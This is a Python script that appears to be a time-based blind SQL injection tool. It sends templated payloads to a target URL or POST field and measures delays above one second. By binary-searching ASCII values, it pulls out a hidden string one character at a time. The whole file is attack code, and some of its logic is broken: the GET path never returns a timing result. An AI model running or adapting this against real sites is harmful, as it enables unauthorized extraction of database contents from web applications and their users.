import sys, requests, argparse
from datetime import timedelta



def createParser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url")
    parser.add_argument("-q", "--query")
    parser.add_argument("-d", "--data", default=None)
    #    parser.add_argument("-h", "--help")
    parser.add_argument("-H", "--headers", default=None)

    return parser


def blind_query(char_index, mid, znak, namespace, headers):
    #  a = namespace.query.replace("[INDEX]", str(char_index)).replace("[MID]", str(mid)).replace("[ZNAK]", znak)
    # print(a)
    # print(namespace.data)
    query = namespace.query.replace("[INDEX]", str(char_index)).replace("[MID]", str(mid)).replace("[ZNAK]", znak)

    if namespace.data == None:
        parameter = str(namespace.url[0]).find("FUZZ")
        if parameter != -1:
            resp = requests.get(url=str(namespace.url).replace("FUZZ", query), headers=headers)
        else:
            raise 
    else:
        resp = requests.post(url=namespace.url, data={namespace.data: query}, headers=headers)
        requtime = resp.elapsed
        resp.close()
        if requtime > answer_delay:
            return True
        else:
            return False


def reqursion_find(start, end, char_index, namespace, headers):
    if start > end:
        return -1
    mid = (start + end) // 2
    if blind_query(char_index=char_index, mid=mid, znak="=", namespace=namespace, headers=headers):
        return mid

    if blind_query(char_index=char_index, mid=mid, znak="<", namespace=namespace, headers=headers):
        return reqursion_find(start, mid - 1, char_index=char_index, namespace=namespace, headers=headers)
    else:
        return reqursion_find(mid + 1, end, char_index=char_index, namespace=namespace, headers=headers)


def strToDict(string=str()):
    result_dict = {}
    while(len(string)>0):
        end_str = 0

        key = string[0: string.find(":")].strip()
        if string.find(":") == -1:
            break
        value = string[string.find(":")+1: string.find("|")].strip()
        if string.find("|") == -1:
            value = string[string.find(":")+1:].strip()
            end_str = 1

        result_dict[key] = value
        string = string.replace(key + ":", "").strip()
        if end_str:
            string.replace(string[0:], "")
            break
        else:
            string = string.replace(value + " | ", "").strip()


    return result_dict



if __name__ == "__main__":
    parser = createParser()
    namespace = parser.parse_args(sys.argv[1:])
    answer_delay = timedelta(seconds=1)


    headers = namespace.headers
    if headers == None:
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                   "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"}
    else:
        headers = strToDict(headers[0])

    final_str = ""
    for i in range(1, 75):
        char = reqursion_find(32, 126, i, namespace, headers)
        if char == -1:
            print("work finish")
            print(final_str)
            break
        else:
            final_str += chr(int(char))
        print(chr(int(char)))


